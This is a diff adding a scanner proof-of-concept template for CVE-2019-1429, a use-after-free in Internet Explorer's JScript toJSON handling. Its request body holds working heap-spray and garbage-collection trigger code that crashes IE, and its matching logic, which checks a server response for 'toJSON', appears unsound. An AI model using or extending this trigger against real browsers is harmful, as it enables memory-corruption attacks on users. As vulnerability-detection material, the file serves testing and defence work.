@@ -1,0 +1,43 @@
+[info]
+author = "AVE"
+description = "检测 Internet Explorer JScript 引擎在 toJSON 回调过程中 arguments 对象释放后重用漏洞，通过构造特制 HTML 页面触发 IE 崩溃"
+id = "POC-AVE-2019-0606"
+name = "CVE-2019-1429 PoC"
+severity = "high"
+tags = ["cve-2019-1429"]
+vuln_id = [
+    "CVE-2019-1429",
+    "AVE-2019-0606",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+<!-- saved from url=(0014)about:internet -->
+<meta http-equiv="X-UA-Compatible" content="IE=8"></meta>
+<script language="Jscript.Encode">
+    var spray = new Array();
+    function F() {
+        for (var i = 0; i < 20000; i++) spray[i] = new Object();
+        arguments[0] = spray[5000];
+        for (var i = 0; i < 20000; i++) spray[i] = 1;
+        CollectGarbage();
+        alert(arguments[0]);
+    }
+    var o = {toJSON:F}
+    JSON.stringify(o);
+</script>"""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["toJSON"]
